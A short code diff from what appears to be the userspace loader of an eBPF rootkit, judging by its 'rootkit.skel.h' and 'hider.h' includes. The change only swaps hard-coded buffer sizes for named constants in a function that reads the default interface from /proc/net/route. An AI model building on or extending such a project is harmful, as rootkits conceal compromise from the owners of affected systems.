@@ -5,9 +5,13 @@
 #include <net/if.h>
 #include <linux/if_link.h>
 #include <errno.h>
+
 #include "config.h"
 #include "userspace/hider.h"
 #include "rootkit.skel.h"
+
+#define LINE_LEN 256
+#define DEV_NAME_LEN 64
 
 /**
  * @brief Get the index of the default active interface by reading /proc/net/route
@@ -16,8 +20,8 @@
  */
 static int get_default_iface_index()
 {
-    char line[256];
-    char dev[64];
+    char line[LINE_LEN];
+    char dev[DEV_NAME_LEN];
     unsigned long dest;
 
     FILE *f = fopen("/proc/net/route", "r");
